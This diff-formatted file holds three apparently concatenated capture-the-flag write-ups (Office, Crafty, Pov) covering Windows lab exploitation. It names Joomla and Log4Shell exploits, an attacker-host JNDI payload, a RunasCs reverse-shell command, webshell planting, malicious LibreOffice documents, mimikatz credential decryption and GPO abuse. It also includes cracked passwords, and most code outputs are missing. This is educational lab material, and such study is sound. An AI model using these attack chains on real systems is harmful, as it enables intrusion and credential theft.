@@ -1,0 +1,320 @@
+Header: Recon
+nmap finds many open TCP ports, looking like a Windows domain controller:
+There a ton here. Notes:
+Given the use of domain names, I’ll try fuzzing for subdomains of office.htb that respond differently. The brute force went really slowly, so I’ll kill that and add that to my later enumeration if I’m stuck.  I’ll add what I have to my /etc/hosts:
+Enumeration to do list:
+netexec confirms the host and domain:
+I’m not able to do any unauth enumeration:
+The site is a blog about Iron Man and holigrams:
+The posts are written by and signed by “Tony Stark”, the CEO of the company. There’s not much else interesting on the page.
+nmap identified the site as Joomla, a free and open-source PHP-based content management system (CMS). There’s a lot of ways to identify this. It’s in the HTML at the top of the main page:
+The robots.txt file points that way as well:
+/administratoris the default relative path for the administrative login. I can get the exact Joomla version at /administrator/manifests/files/joomla.xml:
+I know that Joomla is PHP based, and the main site does load as index.php.
+I’ll skip the directory brute force because I know it’s Joomla and therefore I know it’s structure.
+As nmap reported, the HTTPS site just returns 403:
+Running feroxbuster against this actually finds something interesting:
+I’m using a lowercase wordlist since Windows is typically case-insensitive, and going without recursion as traversing into /joomla finds a ton of stuff. /joomla seems to be the same site as TCP 80’s root.
+
+Header: Auth as dwolfe
+Searching for “Joomla 4.27 exploit” returns a ton of pages about CVE-2023-23752 (most of which are older than Office):
+NIST describes this rather vaguely:
+An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.
+I’ve exploited this vulnerability before in DevVortex, and have a detailed explanation of the vulnerability here, and there’s a nice blog post from VulnCheck as well. The short version is that what is basically a mass-assignment vulnerability allows an attacker to add ?public=true to some private API endpoints and run them unauthenticated. There are many ways to use this. In DevVortex, I leaked usernames and config files that included  a password, and used those to log into the admin panel.
+There are lots of exploit scripts for this one, but it’s just as easy to show manually. For example, visiting /api/index.php/v1/config/application returns 403 forbidden:
+With ?public=true, there’s a bunch of data:
+From this I’ll get the SQL connection information, user root with password “H0lOgrams4reTakIng0Ver754!”.
+/api/index.php/v1/users is another common endpoint to check, but there’s only one user:
+This password doesn’t work as administrator for Office, and it doesn’t work as administrator or root on the Joomla admin login.
+Now that I have a password to try, getting a list of users becomes much more important. I’ll use kerbrute in userenum mode to check for valid users:
+The full list takes 25 minutes, but most of the names come out in the first minute or so.
+I’ll use those users to make a list, and netexec to check the password with each of them:
+There’s a hit on dwolfe. No matches on WinRM:
+
+Header: RCE as web_account
+With a valid credential, I gain access to SMB shares:
+SOC Analysis jumps out as non-standard and therefore most interesting. It contains a single PCAP file:
+I’ll grab it.
+I’ll open the PCAP in Wireshark and start with Statistics –> Endpoints. There are 16 IPv4 endpoints:
+Seems likely that 10.250.0.0/24 is the internal network. The most traffic is from .30. Looking at the TCP numbers, there’s 443 (HTTPS) traffic with all the public IPs. Other than that, .30 has traffic to 88 (Kerberos), 135 (NetBios), and 445 (SMB). The rest of the traffic is high ports from .30 and .41. It seems .30 is the DC, though it’s not clear what all this high port traffic coming out of .30 would be.
+Looking at Statistics –> Conversations shows that all of the traffic where .30 is acting as the client is HTTPS traffic outbound. The traffic from .41 is to services on .30:
+I’m especially interested in how .41 is authenticating, which is likely the port 88 Kerberos. If I add a Wireshark filter for ip.addr==10.250.0.41, there’s only 83 packets (out of almost 2000) to investigate.
+There are two AS-REQ requests from the client:
+This is the request from a client to the DC to get a certificate to authenticate to another service (watch this amazing video for a full explanation of Kerberos). Interestingly, neither of them seems to be successful. Still, the client has signed this request using the user’s NTLM hash, which means it could be susceptible to brute force attacks.
+The first doesn’t have any authentication data, but the second AS-REP packet does:
+This packet includes a timestamp encrypted by the tstart user.
+VSScrub has a really nice post on just this challenge back from 2020. The quick version is that I can create a Hashcat hash from this cipher field knowing that it fits the same encryption type:
+With rockyou.txt it cracks in 12 seconds on my host:
+This password does work for the tstark user for SMB, but not for WinRM:
+Unfortunately, this access doesn’t show anything new in SMB shares.
+This password with the username administrator does work to log into Joomla:
+In DevVortex I showed both modifying a template and creating a plugin. I’ll go for the template modification this time.
+I’ll click on System and select “Site Templates”, and then “Cassiopeia Details and Files”. I’ll edit index.php, and after making a change in a comment to make sure I have permissions (I do), I’ll add a simple webshell that if the cmd parameter is set, it just calls system and returns, and otherwise the page is the same:
+It works:
+This does get reset every few minutes, so I’ll just keep the edit page open, and reclick “Save” any time I need the webshell back.
+
+Header: Shell as TStark
+Rather than get a shell as web_account, I’m going to skip directly to tstark. I’ll host RunasCs on my Python webserver, and download it to programdata:
+There are hits on my Python webserver as well:
+The webshell shows r.exe is there as well:
+I’ll send ?cmd=C:\programdata\r.exe tstark playboy69 cmd.exe -r 10.10.14.5:443, and I get a shell:
+I’ll upgrade to PowerShell:
+And grab user.txt:
+
+Header: Shell as PPotts
+TStark is a member of the “Registry Editors” group:
+That’s a custom group for Office, but it seems to imply that TStark can edit at least parts of the registry.
+There are six home directories on this host:
+That matches up with the accounts on the box:
+I’ve already owned web_account and tstark, both of which has basically empty home directories.
+The webserver here is Xampp, homed out of xampp in the root of C:
+There’s nothing else too interesting in the root.
+The webroots would be stored in C:\xampp\htdocs, which interestingly has three directories:
+There’s nothing new in the joomla dir, as I’ve already leaked the DB connection creds.
+The administrator directory has a single log file at administrator\logs\1.error.php, and it’s not interesting.
+internal seems to be another website:
+In C:\xampp\apache\conf\httpd.conf, I’ll find the setup of the virtual host for this site:
+The applications directory is empty, but it is owned by the PPotts user, and web_account has access to write to it:
+One other useful bit of enumeration is understanding the programs installed on Office.
+It’s worth noting that LibreOffice is installed, where as there’s no sign of Microsoft Office.
+I’ll upload a copy of Chisel to Office:
+And start the server on my host. Now I’ll connect back:
+It hangs, and there’s a connection at my host:
+Now accessible at http://127.0.0.1:8083 on my host, I’ll check out the site, which is for some kind of holographic technologies:
+This page is the index.html file observed above, and there’s a link to /resume.php as “Submit Application”. This page is a form:
+If I upload a file with a blocked extension, it shows an error:
+If I create a text file but name it test.odt, it uploads:
+More than half of resume.php is static HTML making up the form, but there’s PHP right at the top to handle POST requests:
+This is doing some file renaming, and validating that the extension is one of docm, docx, doc, or odt. Then it saves it under an new name to the applications folder (that is owned by PPotts).
+Uploading a valid file does show up in applications:
+After a few minutes, it’s gone.
+There are a couple ways to execute the next step:
+CVE-2023-2255 abuses a “Floating Frame” (similar to an IFrame in HTML) to fetch and display objects within a document. Because these objects can be OLE objects, this can lead to remote code execution.
+There’s a simple POC exploit from elweth-sec that takes --cmd and --output arguments and generates a ODT file.
+I’ll start with a simple ping to make sure this works:
+I’ll upload it and make sure it’s there:
+After a minute or two, I get ICMP packets:
+I’ll grab a PowerShell #3 Bash64 reverse shell from revshells.com and create an ODT:
+I’ll upload it via the form, and after a few minutes I get a shell as PPotts:
+I can create a document with an auto open macro and try to run that, but the macro’s won’t run in the default state. This wiki page documents the MacroSecurityLevel registry key that shows the current settings:
+Based on this page, the value of 3 is currently set on Very High. The ACLs on this key show that the “Registry Editors” group has FullControl:
+I’ll update it:
+It works! It’s worth noting that when I check back in a few minutes the value has reset back to 3.
+I’ll open LibreOffice Writer and a new document, add a macro, and have it run my reverse shell:
+Under “Tools” –> “Customize”, I’ll assign the macro to Open Document:
+I’ll upload this document and wait again. When it processes, I get a reverse shell:
+
+Header: Shell as HHogan
+cmdkey /list will show if there are any saved credentials on the current account:
+The one for HHogan is certainly of interest. They are in the Remote Management Users group, which means if I can recover this credential I can likely connect over WinRM:
+They are also a “GPO Manager”, which will be a escalation vector.
+The system level credentials are stored by DPAPI here:
+The master keys for these is stored here:
+I’ve shown the case of decrypting a DPAPI master key before in Access. The challenge is that the master key is encrypted with the user’s password, and I don’t have it. Fortunately, there’s a blog post from SpecterOps that shows how to decrypt without the password, using an RPC called MS-BKRP (BackupKey Remote Protocol). To abuse this I’ll use the /rpc flag in Mimikatz.
+I’ll upload a copy of mimikatz.exe and run it. From my flimsy shell, I’ll want to run the commands all at once by passing them in, giving the path to the master key as well as the /rpc flag:
+The key is at the bottom, “87eedae4c65e0db…[snip]…”.
+I don’t know which of the three encrypted creds are the one I’m looking for, so I’ll just do all three. I need to pass in the directory as well as the masterkey from above. The first one is the “MyUser” cred, and doesn’t return anything useful:
+The third one errors out:
+The second returns the plaintext creds for HHogan:
+The creds are good for SMB and WinRM:
+I’ll use Evil-WinRM to get a shell:
+I already noted above that HHogan is a member of the “GPO Managers” group:
+There are a handful of GPOs here:
+I’m going to assume that means that HHogan can edit GPOs. GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. It can control basically anything about a Windows computer.
+There’s a really nice tool from FSecureLabs called SharpGPOAbuse designed to abuse GPOs. It offers the following:
+I’ll host a copy on my Python webserver and upload it:
+The first GPO isn’t writable:
+But the second one I try works:
+This doesn’t take effect until the GPO refreshes. HHogan has permissions to run gpupdate /force which will make that happen now:
+Now HHogan is in the administrator’s group:
+It won’t show in my current session, but on exiting and reconnecting:
+And I can read root.txt:
+CTF solutions, malware analysis, home lab development
+
+Header: Recon
+nmap finds two open TCP ports, HTTP (80) and Minecraft (25565):
+Based on the IIS version, the host is running modern Windows. I’ll note the redirect to crafty.htb on 80. I’ll use ffuf to scan for other subdomains that respond differently but not find anything. I’ll add crafty.htb to my /etc/hosts file:
+The page is a Minecraft page:
+The text does show a subdomain, play.crafty.htb, which I’ll add to my /etc/hosts file. Visiting it in a browser just redirects to crafty.htb.
+All three of the image in the middle are links, but they all go to /coming-soon:
+The HTTP response headers show IIS but not much else:
+Trying to guess at extensions, when I go to /index.html, it returns a 301 redirect to /home:
+index.html must exist or be specifically defined, because /0xdf.html returns the standard IIS 404 page. It’s not important to solve the box, but I’ll look at how the webserver is serving the static pages and redirects in Beyond Root.
+I’ll run feroxbuster against the site using a lowercase wordlist since it’s Windows and case-insensitive:
+Nothing interesting.
+It’s worth a note that if I ever accidentally start feroxbuster with the default list and notice that different casings are showing up in the results, it’s worthwhile to kill it and start over, or else it will spend a bunch of time recursing down the same directory multiple times.
+Typically with an unknown port I’ll try interacting via curl and nc to see if it replies at all. curl returns an error message that is common when the service is not expecting HTTP:
+Connecting with ncdoes connection, and then nothing. I can enter text, but it doesn’t respond, until I Ctrl-c to kill the session.
+I did note that nmap got a version string from the server. I’ll start Wireshark and run nmap -p 25565 -sCV 10.10.11.249 to scan it again. The interesting TCP stream is the third of three:
+I’ll switch the view from ASCII to Hex Dump:
+I can recreate this with nc:
+But not much else I can identify manually.
+
+Header: Shell as svc_minecraft
+Log4Shell is one of the most serious vulnerabilities discovered to date. It is a vulnerability in a common Java logging library, Log4J, that results in remote code execution. Minecraft is a well known service that was vulnerable to Log4Shell.
+This post on help.minecraft.net talks about how Log4Shell impacts Minecraft. Specifically, for version 1.12-1.16.5, the startup command line must be modified to patch it, or upgrade to 1.17.
+I’ve shown Log4Shell exploitation of Minecraft before, for Hackvent 2023 Day 19. I’ve shown other exploitations of Log4Shell in Holiday Hack 2021 and on LogForge.
+To exploit Log4Shell on Minecraft, I need to send a specific message to the commands / chat function. To interact with the Minecraft server, I’ll need a client.
+I could download a full Minecraft client, but that costs money. There are many free clients on GitHub! I’ll use Minecraft-Console-Client, downloading the latest release.
+I’ll run it, giving a username. It asks for a password (I’ll entry blank), and then a server, where I can put in Crafty:
+The documentation has a list of commands, all starting with /. If I start typing one, the auto-complete will come up:
+Commands like /dig aren’t enabled yet:
+I can list bots (/bots) or players (/list), though both return empty:
+To send a chat, I’ll just send something not starting with /, and it displays back:
+Once in a while I can be killed:
+/respawn and I’m back:
+The issue with Log4Shell is that the Log4J logging module doesn’t handle well the pattern ${[stuff]}. By putting a JNDI/LDAP url in that pattern, it will cause the logger to fetch data from an arbitrary server and, if that is serialized Java, that leads to execution.
+To test for this, I’ll send listen on TCP port 389 (LDAP default) with nc and then enter a payload that will attempt to contact my host on 389:
+If there’s a connection to my host, then the server is likely vulnerable to Log4Shell. On sending, I get a connection:
+I had good luck with this POC during Hackvent, so I’ll use it again. I’ll clone the repo to my computer and install the dependencies:
+There’s also instructions on the repo for downloading a specific Java binary from this page. I’ll download jdk-8u20-linux-x64.tar.gz from he bottom of that page, and extract it:
+I’ll run the exploit, giving it my IP, a web port to listen on, and the port I want a shell back on:
+It gives me this ${jndi:ldap://10.10.14.6:1389/a} payload, which I can send to Minecraft (and when I do it :
+There’s requests at the exploit server:
+But no shell connection at nc.
+The poc.py script starts off with a generate_payload function that starts defining a template Java program on lines 15-54:
+It puts in the IP and port, writes it to disk, and then compiles it with javac.
+Looking at the payload, it’s using String cmd="/bin/sh";, which won’t work on a Windows host. I’ll edit that to String cmd="cmd.exe";.
+Running the updated exploit, I’ll send the payload to Minecraft. This time there’s only on hit at the exploit:
+And a shell at nc:
+I like to use rlwrap to get things similar to the shell upgrade on Linux.
+The user flag is on the desktop:
+I’ll also switch to PowerShell:
+
+Header: Shell as Administrator
+The website code lives in C:\inetpub. The web root is wwwroot, which has three files as well as directories:
+There’s nothing interesting as far as escalating privileges. It’s just a static site, as expected. This web.config file is nice to look at to understand the behavior noted above, which I’ll look at in Beyond Root.
+There’s only the administrator user who has a home directory on this box besides svc_minecraft:
+The Public folder is empty:
+The Minecraft server is homed in svc_minecraft’s home directory in the server folder:
+I suspect that server.jar is a Minecraft server. I’ll take a file hash:
+Searching on VT I’ll find this:
+There’s one positive hit, but only that it has a vulnerable version of Log4J. It’s been on VT since 2021:
+The names show it’s likely a real Minecraft server. The Community tab agress:
+The plugins directory has a single Jar:
+I’ll hash it:
+And find it on VT. It’s first submission was in February 2024, the day after Crafty released!
+That’s a good sign this is something custom to Crafty.
+To get a copy of this Jar file on my host, I’ll start an SMB server with Impacket’s smbserver.py:
+A username and password are required for most Windows hosts to connect. I’ll mount the share on Crafty:
+Now I can copy the binary to my machine:
+I’ll verify the hash matches:
+I’ll grab a copy of JD-GIU and open the plugin with java -jar jd-gui-1.6.6.jar playercounter-1.0-SNAPSHOT.jar.
+The project is pretty small:
+rkon is a public library for the Source RCON Protocol, designed for game servers. From the docs:
+The Source RCON Protocol is a TCP/IP-based communication protocol used by Source Dedicated Server, which allows console commands to be issued to the server via a “remote console”, or RCON. The most common use of RCON is to allow server owners to control their game servers without direct access to the machine the server is running on. In order for commands to be accepted, the connection must first be authenticated using the server’s RCON password, which can be set using the console variable rcon_password.
+plungin.yml has some basic metadata:
+The Playercounter.class file has the main part of the plugin:
+It’s connecting to rkon on port 27015 with the password “s67u84zKq8IXw”. In theory this is updating a playercount.txt in the web directory, though that file doesn’t actually exist on Crafty.
+Without access to SMB, LDAP, WinRM, Kerberos, or any other authenticated Window services, I don’t have a good way to check this password from my host. I’ll upload a copy of RunasCs by downloading a copy from the releases and hosting it on my Python web server. Then, from a directory svc_minecraft can write to (I like to stage out of C:\programdata), I can request it from Crafty:
+The basic syntax is RunasCs.exe <username> <password> <cmd>. With a bad password, it fails:
+But with the password from the plugin it works:
+RunasCs has a -r option that takes an IP and port to connect stdin, stdout, and stderr of the resulting process to, which works very much like a reverse shell. With nc listening on TCP 443, I’ll run it:
+At my listening nc, there’s a shell as Administrator:
+I’ll switch to PowerShell:
+And grab the flag:
+I noted above that there was interesting behavior around the index.html file on the webserver. Visiting that resulted in a redirect to /home Visiting other files that didn’t exist returned an IIS 404.
+The only other file I could locate on the webserver is /coming-soon.
+The web.config file is where this is all configured. The file is structured as XML data with a series of “rewrite” rules:
+When I show the rules here, I’m removing whitespace from the front to make it easier to read on this page.
+The first rule is looking for requests for exactly index.html:
+If it is a POST, it doesn’t match (though I’m not sure why, as the site doesn’t take POST requests). The action is to redirect to /home, and then on matching it stops processing rules. That explains the redirect to /home.
+For fun, I’ll find my GET request for /index.html in Burp’s Proxy history and send the request to Repeater. Then I’ll right click and change the request method to POST. On sending, the server returns 405 Method Not Allowed:
+The next rule goes with the first:
+It’s matching on /home. The conditions look at if the request matches a file or directory. So if there were a file or directory named home, then it would match. And since both has negate="true", this rule only applies where there isn’t a file or directory named home. On a match, it “rewrites” the url to serve index.html.
+The coming-soon page has two similar rules. The first redirects requests for /coming-soon.html to  /coming-soon:
+The second rewrites requests to /coming-soon to return coming-soon.html:
+The last rule is called “Redirect to domain”:
+It matches on any url, except the condition looks at the {HTTP_HOST}, which is the Host header in the request. That regex is using a negative lookahead to say that any pattern that does not start with crafty.htb will match. Said differently, if the Host header doesn’t start with “crafty.htb”, then this rule will match and redirect to http://crafty.htb.
+CTF solutions, malware analysis, home lab development
+
+Header: Recon
+nmap finds only a single open TCP port, HTTP (80):
+Based on the IIS version the host is running a modern Windows OS.
+The title of the page is pov.htb.
+Given the reference to the domain name, I’ll use ffuf to brute force for any subdomains of pov.htb that return something different from the default page:
+Almost immediately it finds dev.pov.htb. I’ll add both of these to my /etc/hosts file that I can interact with these domains:
+The site is for a cybersecurity monitoring service:
+All of the links on the page go nowhere. The “Contact Us” form doesn’t even submit the input data, so that’s just a placeholder.
+There is an email address on the page, sfitz@pov.htb.
+The HTTP response headers show both IIS and ASP.NET:
+This suggests I could see .aspx pages if there’s any dynamic content.
+The main page loads as index.html, suggesting it’s a static page.
+The 404 page is a standard IIS 404.
+I’ll run feroxbuster against the site, and include -x aspx since I know the site is using ASP.NET, and with a lowercase wordlist since the server is IIS:
+Nothing interesting here.
+The site root redirects to /portfolio, which is a portfolio for a web developer:
+There’s a reference to ASP.NET in bold in the intro paragraph:
+One testimonial says that the he’s good, but not great in ASP.NET security:
+All the links except one go to places on the same page. The “Download CV” link calls JavaScript __doPostBack('download', ''):
+Clicking the button downloads and opens a PDF in a new tab:
+The response headers here show it’s also powered by ASP.NET:
+I’ll take a guess at file extensions, but my bad guesses return 302 redirects to default.aspx, which matches ASP.NET.
+I’ll run feroxbuster against the site, and include -x aspx since I know the site is using ASP.NET, and with a lowercase wordlist since the server is IIS:
+There’s a bunch of redirects that go to /portfolio, but feroxbuster doesn’t find that path on its own. Nothing else looks very interesting. I’ll run again there as well:
+There’s the default.aspx I identified by guessing, as well as contact.aspx.
+This is a bad looking Contact form (almost looks like a mobile site):
+Submitting to this form does send the data, though there’s no sign that anything is done with it. If I get stuck, I can try blind XSS here, but I won’t need to.
+
+Header: Shell as sfitz
+I’ll find the request that is sent when I click “Download CV” in Burp and send it to Repeater (I also like to clear out some unneeded HTTP headers in the request):
+There’s a few interesting things here:
+Given that the request is asking for a file, I’ll try asking for other files as well. I know there’s a default.aspx, and I can read it:
+default.aspx is almost entirely static HTML, but there is the include at the top that brings in C# code. I can read index.aspx.cs as well:
+This is the code that does the file read. It is replacing ../ with an empty string, but otherwise it will read basically any file path.
+I wasn’t able to get system-wide file read working with relative paths (even with bypasses like ....//), but using absolute paths worked fine:
+It’s not clear to me why ..\..\..\Windows\System32\drivers\etc\hosts doesn’t work. Relative paths within the directory do work (as I’ll see shortly). I think that’s because the application is rooted one directory above the current one, and IIS isn’t letting relative paths go outside of it.
+The ViewState configuration is set in the site’s web.config file. There is no web.config in the current (portfolio) directory, but there is one up one level:
+The same file returns from \webconfig:
+I believe this is not a web.config file sitting in the root of the C: drive, but rather reflects that the root of the application is one directory up from the current one.
+The full XML file is:
+I’ll use ysoserial.net with the following options:
+This’ll generate a base64-encoded blob:
+With tcpdump listening for ICMP traffic, I’ll update the __VIEWSTATE POST parameter in Burp Repeater and send:
+It returns immediately. At tcpdump:
+That’s remote code execution (RCE)!
+I’ll grab a reverse shell from revshells.com, PowerShell #3 (Base64), and update my YSoSerial.NET command, replacing the ping with the reverse shell:
+On updating my __VIEWSTATE and submitting the request, there’s a shell at nc:
+
+Header: Shell as alaading
+whoami /all gives a ton of information about sfitz:
+It’s interesting that the user is in an IIS APPPOOL group, but doesn’t have SeImpersonatePrivilege. Nothing exciting here.
+There are a few user home directories on Pov:
+The interesting ones are alaading and Administrator.
+sfitz’s Desktop is empty, but there’s a file in Documents:
+It is a PSCredential file for alaading:
+The PowerShell credential is encrypted with key material on the box it was generated on. That means I can’t exfil it and decrypt it on my machine without a bunch of extra work.
+Instead, I’ll use the Import-CliXml PowerShell commandlet to read the file and get the plaintext password:
+I’ll download a copy of RunasCs.exe and host it with a Python webserver on my host. Then I can upload it to Pov:
+I’ll run it:
+At listening nc:
+I’ll switch to PowerShell:
+
+Header: Shell as Administrator
+alaading has the SeDebugPrivilege enabled:
+Interesting, before I switched to PowerShell from cmd, it was there, but disabled:
+This 2008 blog post on devblogs.microsoft.com has the title “If you grant somebody SeDebugPrivilege, you gave away the farm”. Basically, because a user with that privilege can debug any process (including those running as system), they can inject code into those processes and run whatever they want as that user.
+I’ll show two ways to abuse this privilege:
+One of the coolest features of Meterpreter is that it allows migrating from one process into another. Typically, this can only be done in processes running as the same user, unless Meterpreter is running as an administrator or System. However, the SeDebugPrivilege is enough to allow this as well.
+I’ll start by making a payload to get a Meterpreter shell on Pov:
+This makes rev.exe. I’ll serve it with Python and upload it to programdata.
+I’ll start msf-console and use the exploit/multi/handler exploit, setting the payload, lhost, and lport:
+Now I’ll run it:
+On Pov, I’ll run rev.exe:
+At Metasploit:
+I need the PID of a process running as SYSTEM, like winlogon.exe:
+Now I’ll just migrate into it:
+And I’m system:
+I can drop to a shell and get root.txt:
+The HackTricks section on SeDebugPrivilege links to three exploits that will get a shell as system:
+The last one is a PowerShell script, and therefore seems like the easiest place to start.
+I’ll host it with a Python webserver and upload it and import it to my current session:
+I need the PID of a process running as System (548 for winlogon.exe from above should be fine). According to documentation, I should be able to run something like:
+Error 122 is ERROR_INSUFFICIENT_BUFFER, “The data area passed to a system call is too small.”. Shoutout to Deus who pointed out that I can also check this error code with certutil:
+So does that mean my command is too long? I can try a shorter one:
+Same error, and no ICMP packets at my host. Some testing and playing around with this with IppSec suggests that it’s something about the shell process I have here.
+I’ll upload Chisel to the box and use it to create a tunnel from 5985 on my host to 5985 on Pov. Then I can connect over Evil-WinRM:
+From here, the same command as above outputs nothing:
+But this time I get a shell at nc:
+CTF solutions, malware analysis, home lab development
+
